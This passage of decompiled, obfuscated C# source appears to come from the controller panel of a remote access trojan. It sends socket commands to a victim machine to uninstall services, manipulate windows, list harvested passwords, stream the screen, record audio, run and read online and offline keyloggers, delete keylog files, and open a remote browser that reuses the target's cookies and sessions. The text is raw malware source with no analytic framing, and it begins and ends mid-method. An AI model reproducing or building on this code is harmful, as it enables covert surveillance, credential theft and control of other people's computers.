                    class3.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
                    {
                        new Thread(new ThreadStart(class3._Lambda$__0)).Start();
                    }
                }
                num2++;
            }
        }
    }

    private void method_199(object sender, EventArgs e)
    {
        if (this.vmethod_578().Items.Count != 0)
        {
            GClass7 class2 = this.vmethod_578();
            int num = class2.Items.Count - 1;
            int num2 = 0;
            while (true)
            {
                if (num2 > num)
                {
                    class2 = null;
                    break;
                }
                if (class2.Items[num2].Selected)
                {
                    Class136.Class138 class3 = new Class136.Class138();
                    class3.string_0 = this.string_4;
                    class3.string_1 = "srv_control|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(class2.Items[num2].Text)) + "|3";
                    class3.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
                    {
                        new Thread(new ThreadStart(class3._Lambda$__0)).Start();
                    }
                }
                num2++;
            }
        }
    }

    public void method_2(ref string string_12)
    {
        int num2;
        ProjectData.ClearProjectError();
        if (this.vmethod_418().InvokeRequired)
        {
            object[] args = new object[] { string_12 };
            this.vmethod_418().Invoke(new Delegate6(this.method_2), args);
        }
        else
        {
            string_12 = Strings.Replace(string_12, "&", "&amp;", 1, -1, CompareMethod.Text);
            if (Operators.CompareString(string_12.Substring(string_12.Length - 0x2e), "</app_password>\r\n</app_password_list>\r\n</root>", true) != 0)
            {
                string_12 = string_12 + "</app_password>\r\n</app_password_list>\r\n</root>";
            }
            XmlDocument document = new XmlDocument();
            document.LoadXml(string_12);
            XmlNodeList list = document.SelectNodes("/root/app_password_list/app_password");
            this.vmethod_418().Items.Clear();
            IEnumerator enumerator = list.GetEnumerator();
            while (true)
            {
                if (!enumerator.MoveNext())
                {
                    if (enumerator is IDisposable)
                    {
                        (enumerator as IDisposable).Dispose();
                    }
                    this.vmethod_470().Text = "Logins: " + Conversions.ToString(this.vmethod_418().Items.Count);
                    this.vmethod_418().Enabled = true;
                    break;
                }
                XmlNode current = (XmlNode) enumerator.Current;
                string[] items = new string[] { current.ChildNodes.Item(0).InnerText, current.ChildNodes.Item(1).InnerText, current.ChildNodes.Item(2).InnerText, current.ChildNodes.Item(3).InnerText, current.ChildNodes.Item(4).InnerText };
                this.vmethod_418().Items.Add(new ListViewItem(items));
            }
        }
        if (num2 != 0)
        {
            ProjectData.ClearProjectError();
        }
    }

    private void method_20(object sender, EventArgs e)
    {
        this.vmethod_552().Enabled = false;
        this.vmethod_552().Items.Clear();
        this.vmethod_554().BringToFront();
        this.vmethod_554().Visible = true;
        Class136.Class138 class2 = new Class136.Class138();
        class2.string_0 = this.string_4;
        class2.string_1 = "info|1";
        class2.long_0 = 0L;
        if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
        {
            new Thread(new ThreadStart(class2._Lambda$__0)).Start();
        }
    }

    private void method_200(object sender, EventArgs e)
    {
        if ((MessageBox.Show("Are you sure you want to uninstall the selected service(s)?", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes) && (this.vmethod_578().Items.Count != 0))
        {
            GClass7 class2 = this.vmethod_578();
            int num = class2.Items.Count - 1;
            int num2 = 0;
            while (true)
            {
                if (num2 > num)
                {
                    class2 = null;
                    break;
                }
                if (class2.Items[num2].Selected)
                {
                    Class136.Class138 class3 = new Class136.Class138();
                    class3.string_0 = this.string_4;
                    class3.string_1 = "srv_uninstall|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(class2.Items[num2].Text));
                    class3.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
                    {
                        new Thread(new ThreadStart(class3._Lambda$__0)).Start();
                    }
                }
                num2++;
            }
        }
    }

    private void method_201(object sender, EventArgs e)
    {
        if (this.vmethod_578().Items.Count != 0)
        {
            Clipboard.Clear();
            string left = null;
            GClass7 class2 = this.vmethod_578();
            int num3 = class2.Items.Count - 1;
            int num = 0;
            while (true)
            {
                if (num > num3)
                {
                    class2 = null;
                    if (Operators.CompareString(left, null, true) != 0)
                    {
                        Clipboard.Clear();
                        string text1 = left.ToString();
                        Clipboard.SetText(text1.Remove(text1.LastIndexOf("\r\n")));
                    }
                    break;
                }
                if (class2.Items[num].Selected)
                {
                    left = left + class2.Items[num].Text;
                    int num4 = class2.Columns.Count - 1;
                    int num2 = 1;
                    while (true)
                    {
                        if (num2 > num4)
                        {
                            left = left + "\r\n";
                            break;
                        }
                        left = left + "\t" + class2.Items[num].SubItems[num2].Text;
                        num2++;
                    }
                }
                num++;
            }
        }
    }

    private void method_202(object sender, EventArgs e)
    {
        if (this.vmethod_578().Items.Count != 0)
        {
            Clipboard.Clear();
            string left = null;
            GClass7 class2 = this.vmethod_578();
            int num3 = class2.Items.Count - 1;
            int num = 0;
            while (true)
            {
                if (num > num3)
                {
                    class2 = null;
                    if (Operators.CompareString(left, null, true) != 0)
                    {
                        Clipboard.Clear();
                        string text1 = left.ToString();
                        Clipboard.SetText(text1.Remove(text1.LastIndexOf("\r\n")));
                    }
                    break;
                }
                left = left + class2.Items[num].Text;
                int num4 = class2.Columns.Count - 1;
                int num2 = 1;
                while (true)
                {
                    if (num2 > num4)
                    {
                        left = left + "\r\n";
                        num++;
                        break;
                    }
                    left = left + "\t" + class2.Items[num].SubItems[num2].Text;
                    num2++;
                }
            }
        }
    }

    private void method_203(object sender, MouseEventArgs e)
    {
        this.vmethod_344().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_316().SelectedItems.Count > 0, true, false));
        this.vmethod_334().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_316().SelectedItems.Count > 0, true, false));
        this.vmethod_338().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_316().Items.Count > 0, true, false));
    }

    private void method_204(object sender, EventArgs e)
    {
        this.vmethod_18().SelectedIndex = 14;
        this.method_41();
    }

    private void method_205(object sender, EventArgs e)
    {
    }

    private void method_206(object sender, FormatRowEventArgs e)
    {
        if (Operators.CompareString(((Class126) e.get_Model()).string_1, Class130.concurrentDictionary_3[this.string_4].sPID, true) == 0)
        {
            e.get_Item().BackColor = Color.DeepSkyBlue;
        }
    }

    private void method_207(object sender, KeyEventArgs e)
    {
        if (e.KeyData == (Keys.Control | Keys.A))
        {
            IEnumerator enumerator = this.vmethod_578().Items.GetEnumerator();
            while (enumerator.MoveNext())
            {
                ((ListViewItem) enumerator.Current).Selected = true;
            }
        }
    }

    private void method_208(object sender, EventArgs e)
    {
        this.vmethod_624().Enabled = false;
        this.vmethod_624().Items.Clear();
        this.vmethod_614().BringToFront();
        this.vmethod_614().Visible = true;
        Class136.Class138 class2 = new Class136.Class138();
        class2.string_0 = this.string_4;
        class2.string_1 = "wnd_list|1";
        class2.long_0 = 0L;
        if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
        {
            new Thread(new ThreadStart(class2._Lambda$__0)).Start();
        }
    }

    private void method_209(object sender, EventArgs e)
    {
        if (this.vmethod_624().Items.Count != 0)
        {
            GClass7 class2 = this.vmethod_624();
            int num = class2.Items.Count - 1;
            int num2 = 0;
            while (true)
            {
                if (num2 > num)
                {
                    class2 = null;
                    break;
                }
                if (class2.Items[num2].Selected)
                {
                    Class136.Class138 class3 = new Class136.Class138();
                    class3.string_0 = this.string_4;
                    class3.string_1 = "wnd_cmd|" + class2.Items[num2].SubItems[2].Text + "|1";
                    class3.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
                    {
                        new Thread(new ThreadStart(class3._Lambda$__0)).Start();
                    }
                }
                num2++;
            }
        }
    }

    private void method_21(object sender, EventArgs e)
    {
        if (this.vmethod_552().Items.Count != 0)
        {
            string left = null;
            GClass7 class2 = this.vmethod_552();
            int num3 = class2.Items.Count - 1;
            int num = 0;
            while (true)
            {
                if (num > num3)
                {
                    class2 = null;
                    if (Operators.CompareString(left, null, true) != 0)
                    {
                        Clipboard.Clear();
                        string text1 = left.ToString();
                        Clipboard.SetText(text1.Remove(text1.LastIndexOf("\r\n")));
                    }
                    break;
                }
                if (class2.Items[num].Selected)
                {
                    left = left + class2.Items[num].Text;
                    int num4 = class2.Columns.Count - 1;
                    int num2 = 1;
                    while (true)
                    {
                        if (num2 > num4)
                        {
                            left = left + "\r\n";
                            break;
                        }
                        left = left + "\t" + class2.Items[num].SubItems[num2].Text;
                        num2++;
                    }
                }
                num++;
            }
        }
    }

    private void method_210(object sender, EventArgs e)
    {
        if (this.vmethod_624().Items.Count != 0)
        {
            GClass7 class2 = this.vmethod_624();
            int num = class2.Items.Count - 1;
            int num2 = 0;
            while (true)
            {
                if (num2 > num)
                {
                    class2 = null;
                    break;
                }
                if (class2.Items[num2].Selected)
                {
                    Class136.Class138 class3 = new Class136.Class138();
                    class3.string_0 = this.string_4;
                    class3.string_1 = "wnd_cmd|" + class2.Items[num2].SubItems[2].Text + "|3";
                    class3.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
                    {
                        new Thread(new ThreadStart(class3._Lambda$__0)).Start();
                    }
                }
                num2++;
            }
        }
    }

    private void method_211(object sender, EventArgs e)
    {
        if (this.vmethod_624().Items.Count != 0)
        {
            GClass7 class2 = this.vmethod_624();
            int num = class2.Items.Count - 1;
            int num2 = 0;
            while (true)
            {
                if (num2 > num)
                {
                    class2 = null;
                    break;
                }
                if (class2.Items[num2].Selected)
                {
                    Class136.Class138 class3 = new Class136.Class138();
                    class3.string_0 = this.string_4;
                    class3.string_1 = "wnd_cmd|" + class2.Items[num2].SubItems[2].Text + "|6";
                    class3.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
                    {
                        new Thread(new ThreadStart(class3._Lambda$__0)).Start();
                    }
                }
                num2++;
            }
        }
    }

    private void method_212(object sender, EventArgs e)
    {
        if (this.vmethod_624().Items.Count != 0)
        {
            GClass7 class2 = this.vmethod_624();
            int num = class2.Items.Count - 1;
            int num2 = 0;
            while (true)
            {
                if (num2 > num)
                {
                    class2 = null;
                    break;
                }
                if (class2.Items[num2].Selected)
                {
                    Class136.Class138 class3 = new Class136.Class138();
                    class3.string_0 = this.string_4;
                    class3.string_1 = "wnd_cmd|" + class2.Items[num2].SubItems[2].Text + "|11";
                    class3.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
                    {
                        new Thread(new ThreadStart(class3._Lambda$__0)).Start();
                    }
                }
                num2++;
            }
        }
    }

    private void method_213(object sender, EventArgs e)
    {
        if (this.vmethod_624().Items.Count != 0)
        {
            GClass7 class2 = this.vmethod_624();
            int num = class2.Items.Count - 1;
            int num2 = 0;
            while (true)
            {
                if (num2 > num)
                {
                    class2 = null;
                    break;
                }
                if (class2.Items[num2].Selected)
                {
                    Class136.Class138 class3 = new Class136.Class138();
                    class3.string_0 = this.string_4;
                    class3.string_1 = "wnd_cmd|" + class2.Items[num2].SubItems[2].Text + "|9";
                    class3.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
                    {
                        new Thread(new ThreadStart(class3._Lambda$__0)).Start();
                    }
                }
                num2++;
            }
        }
    }

    private void method_214(object sender, EventArgs e)
    {
        if (this.vmethod_624().Items.Count != 0)
        {
            GClass7 class2 = this.vmethod_624();
            int num = class2.Items.Count - 1;
            int num2 = 0;
            while (true)
            {
                if (num2 > num)
                {
                    class2 = null;
                    break;
                }
                if (class2.Items[num2].Selected)
                {
                    Class136.Class138 class3 = new Class136.Class138();
                    class3.string_0 = this.string_4;
                    class3.string_1 = "wnd_cmd|" + class2.Items[num2].SubItems[2].Text + "|0";
                    class3.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
                    {
                        new Thread(new ThreadStart(class3._Lambda$__0)).Start();
                    }
                }
                num2++;
            }
        }
    }

    private void method_215(object sender, EventArgs e)
    {
        if (this.vmethod_624().Items.Count != 0)
        {
            GClass7 class2 = this.vmethod_624();
            int num = class2.Items.Count - 1;
            int num2 = 0;
            while (true)
            {
                if (num2 > num)
                {
                    class2 = null;
                    break;
                }
                if (class2.Items[num2].Selected)
                {
                    Class136.Class138 class3 = new Class136.Class138();
                    class3.string_0 = this.string_4;
                    class3.string_1 = "wnd_cmd|" + class2.Items[num2].SubItems[2].Text + "|-1";
                    class3.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
                    {
                        new Thread(new ThreadStart(class3._Lambda$__0)).Start();
                    }
                }
                num2++;
            }
        }
    }

    private void method_216(object sender, EventArgs e)
    {
        string left = Interaction.InputBox("Enter a new title", Application.ProductName, string.Empty, -1, -1);
        if ((Operators.CompareString(left, string.Empty, true) == 0) | (left.Length > 260))
        {
            Interaction.MsgBox("Invalid title!", MsgBoxStyle.Exclamation, Application.ProductName);
        }
        else if (this.vmethod_624().Items.Count != 0)
        {
            GClass7 class2 = this.vmethod_624();
            int num = class2.Items.Count - 1;
            int num2 = 0;
            while (true)
            {
                if (num2 > num)
                {
                    class2 = null;
                    break;
                }
                if (class2.Items[num2].Selected)
                {
                    Class136.Class138 class3 = new Class136.Class138();
                    class3.string_0 = this.string_4;
                    class3.string_1 = "wnd_title|" + class2.Items[num2].SubItems[2].Text + "|" + left;
                    class3.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
                    {
                        new Thread(new ThreadStart(class3._Lambda$__0)).Start();
                    }
                }
                num2++;
            }
        }
    }

    private void method_217(object sender, EventArgs e)
    {
        int selectedIndex = this.vmethod_18().SelectedIndex;
        if (selectedIndex == 2)
        {
            if (this.vmethod_78().Items.Count > 0)
            {
                this.vmethod_670().Text = "Selected: " + Conversions.ToString(this.vmethod_78().SelectedItems.Count);
            }
        }
        else
        {
            switch (selectedIndex)
            {
                case 9:
                    if (this.vmethod_718().Items.Count <= 0)
                    {
                        break;
                    }
                    this.vmethod_676().Text = "Selected: " + Conversions.ToString(this.vmethod_718().SelectedItems.Count);
                    return;

                case 10:
                case 11:
                    break;

                case 12:
                    if (this.vmethod_550().Items.Count <= 0)
                    {
                        break;
                    }
                    this.vmethod_674().Text = "Selected: " + Conversions.ToString(this.vmethod_550().SelectedItems.Count);
                    return;

                case 13:
                    if (this.vmethod_578().Items.Count <= 0)
                    {
                        break;
                    }
                    this.vmethod_666().Text = "Selected: " + Conversions.ToString(this.vmethod_578().SelectedItems.Count);
                    return;

                case 14:
                    if (this.vmethod_624().Items.Count > 0)
                    {
                        this.vmethod_672().Text = "Selected: " + Conversions.ToString(this.vmethod_624().SelectedItems.Count);
                    }
                    break;

                default:
                    return;
            }
        }
    }

    private void method_218(object sender, EventArgs e)
    {
        if (this.vmethod_624().Items.Count != 0)
        {
            Clipboard.Clear();
            string left = null;
            GClass7 class2 = this.vmethod_624();
            int num3 = class2.Items.Count - 1;
            int num = 0;
            while (true)
            {
                if (num > num3)
                {
                    class2 = null;
                    if (Operators.CompareString(left, null, true) != 0)
                    {
                        Clipboard.Clear();
                        string text1 = left.ToString();
                        Clipboard.SetText(text1.Remove(text1.LastIndexOf("\r\n")));
                    }
                    break;
                }
                if (class2.Items[num].Selected)
                {
                    left = left + class2.Items[num].Text;
                    int num4 = class2.Columns.Count - 1;
                    int num2 = 1;
                    while (true)
                    {
                        if (num2 > num4)
                        {
                            left = left + "\r\n";
                            break;
                        }
                        left = left + "\t" + class2.Items[num].SubItems[num2].Text;
                        num2++;
                    }
                }
                num++;
            }
        }
    }

    private void method_219(object sender, EventArgs e)
    {
        if (this.vmethod_624().Items.Count != 0)
        {
            Clipboard.Clear();
            string left = null;
            GClass7 class2 = this.vmethod_624();
            int num3 = class2.Items.Count - 1;
            int num = 0;
            while (true)
            {
                if (num > num3)
                {
                    class2 = null;
                    if (Operators.CompareString(left, null, true) != 0)
                    {
                        Clipboard.Clear();
                        string text1 = left.ToString();
                        Clipboard.SetText(text1.Remove(text1.LastIndexOf("\r\n")));
                    }
                    break;
                }
                left = left + class2.Items[num].Text;
                int num4 = class2.Columns.Count - 1;
                int num2 = 1;
                while (true)
                {
                    if (num2 > num4)
                    {
                        left = left + "\r\n";
                        num++;
                        break;
                    }
                    left = left + "\t" + class2.Items[num].SubItems[num2].Text;
                    num2++;
                }
            }
        }
    }

    public void method_22(ref string string_12)
    {
        int num2;
        ProjectData.ClearProjectError();
        if (this.vmethod_552().InvokeRequired)
        {
            object[] args = new object[] { string_12 };
            this.vmethod_552().Invoke(new Delegate35(this.method_22), args);
        }
        else
        {
            this.vmethod_554().SendToBack();
            this.vmethod_554().Visible = false;
            if (string_12.Length >= 3)
            {
                List<JToken> list = Enumerable.ToList<JToken>(JObject.Parse(string_12.Substring(7, string_12.Length - 8))["block"]);
                this.vmethod_552().Items.Clear();
                List<JToken>.Enumerator enumerator = list.GetEnumerator();
                while (enumerator.MoveNext())
                {
                    JToken current = enumerator.Current;
                    string[] items = new string[] { current["val1"].ToString(), current["val2"].ToString() };
                    this.vmethod_552().Items.Add(new ListViewItem(items));
                }
            }
        }
        if (num2 != 0)
        {
            ProjectData.ClearProjectError();
        }
    }

    private void method_220(object sender, EventArgs e)
    {
        Interaction.MsgBox("The web browser will attempt to launch in Incognito mode.\r\n\r\nNote: This feature is only compatible with Chrome.", MsgBoxStyle.Information, Application.ProductName);
    }

    private void method_221(object sender, EventArgs e)
    {
        Interaction.MsgBox("The web browser will forcefully attempt to create and use a new profile, thus preventing any unwanted interference.\r\n\r\nNote: If existing sessions, cookies or cache is needed then do not use this feature. Instead, start the remote browser whenever the target browser is not running, or closed.", MsgBoxStyle.Information, Application.ProductName);
    }

    private void method_222(object sender, EventArgs e)
    {
        Class136.Class138 class2;
        if (Operators.CompareString(this.vmethod_686().Text, "Start", true) != 0)
        {
            if (Operators.CompareString(this.vmethod_686().Text, "Stop", true) == 0)
            {
                this.vmethod_686().Enabled = false;
                class2 = new Class136.Class138();
                class2.string_0 = this.string_4;
                class2.string_1 = "screenlive_stop|1";
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
                if (Class130.concurrentDictionary_3.ContainsKey(this.string_4) && Class130.concurrentDictionary_3.ContainsKey(Class130.concurrentDictionary_3[this.string_4].SCREENLIVE_SOCKET_ID))
                {
                    Class130.concurrentDictionary_3[Class130.concurrentDictionary_3[this.string_4].SCREENLIVE_SOCKET_ID].SOCKET_DISCONNECT(ref true);
                }
            }
        }
        else
        {
            Class130.concurrentDictionary_3[this.string_4].SCREEN_IS_STREAMING = true;
            string[] textArray1 = new string[9];
            textArray1[0] = "screenlive|";
            textArray1[1] = this.string_4;
            textArray1[2] = "|";
            textArray1[3] = Conversions.ToString(this.vmethod_88().SelectedIndex);
            textArray1[4] = "|";
            textArray1[5] = Conversions.ToString(Conversions.ToInteger(Strings.Replace(this.vmethod_82().Text, "%", string.Empty, 1, -1, CompareMethod.Text)));
            textArray1[6] = "|";
            textArray1[7] = Conversions.ToString(this.vmethod_688().Value);
            textArray1[8] = "|";
            class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(textArray1), Interaction.IIf(this.vmethod_96().Checked, "1", "0")), "|"), Interaction.IIf(this.vmethod_98().Checked, "1", "0")), "|"), this.vmethod_250().SelectedIndex), "|"), this.vmethod_24().Width), "|"), this.vmethod_24().Height), "|"), Interaction.IIf(this.vmethod_246().Checked, "1", "0")));
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
            this.vmethod_686().Text = "Stop";
            this.vmethod_24().Focus();
            this.vmethod_246().Enabled = false;
            this.vmethod_86().Enabled = false;
            this.vmethod_88().Enabled = false;
            this.vmethod_250().Enabled = false;
        }
    }

    private void method_223(object sender, ScrollEventArgs e)
    {
        this.vmethod_92().Text = Conversions.ToString(this.vmethod_688().Value) + "%";
        if (Operators.CompareString(this.string_4, null, true) != 0)
        {
            Class136.Class138 class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = "screenlive_quality|" + Conversions.ToString(this.vmethod_688().Value);
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
        this.vmethod_24().Focus();
    }

    private void method_224(object sender, MouseEventArgs e)
    {
        this.vmethod_40().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_78().SelectedItems.Count > 0, true, false));
        this.vmethod_42().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_78().SelectedItems.Count > 0, true, false));
        this.vmethod_46().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_78().SelectedItems.Count > 0, true, false));
        this.vmethod_50().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_78().SelectedItems.Count > 0, true, false));
        this.vmethod_48().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_78().SelectedItems.Count > 0, true, false));
    }

    private void method_225(object sender, EventArgs e)
    {
        Class136.Class138 class2;
        if (Operators.CompareString(this.vmethod_692().Text, "Start", true) != 0)
        {
            this.vmethod_342().Tag = string.Empty;
            this.vmethod_304().Enabled = true;
            this.vmethod_320().Enabled = true;
            this.vmethod_326().Enabled = true;
            class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = "aud_rec_stop|1";
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
            this.vmethod_692().Text = "Start";
            this.vmethod_692().Refresh();
        }
        else
        {
            this.int_3 = Conversions.ToInteger(this.vmethod_304().SelectedItem.ToString());
            this.int_4 = Conversions.ToInteger(this.vmethod_320().SelectedItem.ToString());
            this.vmethod_304().Enabled = false;
            this.vmethod_320().Enabled = false;
            string[] textArray1 = new string[] { "aud_rec_start|", Conversions.ToString(this.int_4), "|", Conversions.ToString(this.int_3), "|", Conversions.ToString(this.vmethod_326().SelectedIndex) };
            class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = string.Concat(textArray1);
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
            this.vmethod_342().Tag = Class136.smethod_36();
            this.vmethod_692().Text = "Stop";
            this.vmethod_692().Refresh();
            this.vmethod_326().Enabled = false;
        }
    }

    private void method_226(object sender, EventArgs e)
    {
        this.vmethod_694().Enabled = false;
        Class136.Class138 class2 = new Class136.Class138();
        class2.string_0 = this.string_4;
        class2.string_1 = "aud_rec_list|1";
        class2.long_0 = 0L;
        if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
        {
            new Thread(new ThreadStart(class2._Lambda$__0)).Start();
        }
    }

    private void method_227(object sender, EventArgs e)
    {
        this.method_228();
    }

    private void method_228()
    {
        this.vmethod_446().Enabled = false;
        this.vmethod_448().Enabled = false;
        this.vmethod_450().Enabled = false;
        this.vmethod_696().Enabled = false;
        this.vmethod_452().Enabled = false;
        this.vmethod_454().Enabled = false;
        this.vmethod_76().Enabled = false;
        this.string_8 = string.Empty;
        this.vmethod_398().Text = "Path: N/A";
        this.vmethod_720().Items.Clear();
        this.vmethod_76().Items.Clear();
        this.vmethod_474().BringToFront();
        this.vmethod_474().Visible = true;
        Class136.Class138 class2 = new Class136.Class138();
        class2.string_0 = this.string_4;
        class2.string_1 = "drives_get|1";
        class2.long_0 = 0L;
        if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
        {
            new Thread(new ThreadStart(class2._Lambda$__0)).Start();
        }
    }

    private void method_229(object sender, EventArgs e)
    {
        this.vmethod_204().Visible = false;
        this.vmethod_214().set_Value(0);
        this.vmethod_208().Text = "Current: N/ A";
        if (this.vmethod_156().Top < this.vmethod_204().Top)
        {
            this.vmethod_156().Top = this.vmethod_204().Top;
        }
        else
        {
            this.vmethod_204().Top = this.vmethod_156().Top;
        }
    }

    public void method_23(ref string[] string_12)
    {
        ImageList list1 = new ImageList();
        list1.ImageSize = new Size(0x18, 20);
        this.imageList_3 = list1;
        if (this.vmethod_746().InvokeRequired)
        {
            object[] args = new object[] { string_12 };
            this.vmethod_746().Invoke(new Delegate12(this.method_23), args);
        }
        else
        {
            this.vmethod_754().SendToBack();
            this.vmethod_754().Visible = false;
            this.vmethod_746().Items.Clear();
            int num3 = string_12.Length - 1;
            for (int i = 0; i <= num3; i++)
            {
                int num2;
                Image image = Image.FromFile(Application.StartupPath + @"\data\media\icons\regkey.png");
                string[] strArray = Strings.Split(string_12[i], ",", -1, CompareMethod.Text);
                this.imageList_3.Images.Add(strArray[0], image);
                Class127 item = new Class127(strArray[0], image);
                this.vmethod_746().Items.Add(item);
                num2++;
            }
            this.collection_0.Clear();
            this.vmethod_744().Enabled = true;
            this.vmethod_730().Enabled = false;
            this.vmethod_728().Enabled = false;
            if (this.vmethod_746().Items.Count > 0)
            {
                this.vmethod_746().SelectedIndex = 1;
                this.vmethod_748().Enabled = true;
                this.vmethod_750().Enabled = true;
            }
        }
    }

    private void method_230(object sender, EventArgs e)
    {
        this.vmethod_156().Visible = false;
        this.vmethod_160().set_Value(0);
        this.vmethod_164().Text = "Current: N/A";
        if (this.vmethod_156().Top < this.vmethod_204().Top)
        {
            this.vmethod_156().Top = this.vmethod_204().Top;
        }
        else
        {
            this.vmethod_204().Top = this.vmethod_156().Top;
        }
    }

    private void method_231(object sender, EventArgs e)
    {
        this.vmethod_556().BringToFront();
        this.vmethod_556().Visible = true;
        this.vmethod_280().Clear();
        this.vmethod_280().Enabled = false;
        this.vmethod_388().Enabled = false;
        this.vmethod_712().Enabled = false;
        this.vmethod_702().Enabled = false;
        this.vmethod_704().Enabled = false;
        Class136.Class138 class2 = new Class136.Class138();
        class2.string_0 = this.string_4;
        class2.string_1 = "klgoff_list|1";
        class2.long_0 = 0L;
        if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
        {
            new Thread(new ThreadStart(class2._Lambda$__0)).Start();
        }
    }

    private void method_232(object sender, EventArgs e)
    {
        if (this.vmethod_388().Items.Count <= 0)
        {
            Interaction.MsgBox("No logs available!", MsgBoxStyle.Exclamation, Application.ProductName);
        }
        else
        {
            StringBuilder builder = new StringBuilder();
            int num = this.vmethod_388().Items.Count - 1;
            for (int i = 0; i <= num; i++)
            {
                builder.Append(Operators.ConcatenateObject(this.vmethod_388().Items[i].Tag, "|"));
            }
            this.vmethod_556().BringToFront();
            this.vmethod_556().Visible = true;
            this.vmethod_280().Clear();
            this.vmethod_280().Enabled = false;
            this.vmethod_388().Enabled = false;
            this.vmethod_712().Enabled = false;
            this.vmethod_702().Enabled = false;
            this.vmethod_704().Enabled = false;
            this.vmethod_280().Clear();
            this.vmethod_280().Enabled = false;
            Class136.Class138 class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = "klgoff_get|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(builder.ToString()));
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
    }

    private void method_233(object sender, EventArgs e)
    {
        if (this.vmethod_388().Items.Count == 0)
        {
            Interaction.MsgBox("No logs exists!", MsgBoxStyle.Exclamation, Application.ProductName);
        }
        else if (MessageBox.Show("Permanently delete all logs?", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
        {
            StringBuilder builder = new StringBuilder();
            int num = this.vmethod_388().Items.Count - 1;
            int num2 = 0;
            while (true)
            {
                if (num2 > num)
                {
                    this.vmethod_556().BringToFront();
                    this.vmethod_556().Visible = true;
                    this.vmethod_280().Clear();
                    this.vmethod_280().Enabled = false;
                    this.vmethod_388().Enabled = false;
                    this.vmethod_712().Enabled = false;
                    this.vmethod_702().Enabled = false;
                    this.vmethod_704().Enabled = false;
                    this.vmethod_280().Clear();
                    this.vmethod_280().Enabled = false;
                    Class136.Class138 class2 = new Class136.Class138();
                    class2.string_0 = this.string_4;
                    class2.string_1 = "klgoff_del|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(builder.ToString()));
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                    break;
                }
                builder.Append(Operators.ConcatenateObject(this.vmethod_388().Items[num2].Tag, "|"));
                num2++;
            }
        }
    }

    private void method_234(object sender, EventArgs e)
    {
        Class136.Class138 class2;
        if (Operators.CompareString(this.vmethod_706().Text, "Start", true) == 0)
        {
            class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = "klgonlinestart|1";
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
        else
        {
            class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = "klgonlinestop|1";
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
        this.vmethod_706().Enabled = false;
    }

    private void method_235(object sender, EventArgs e)
    {
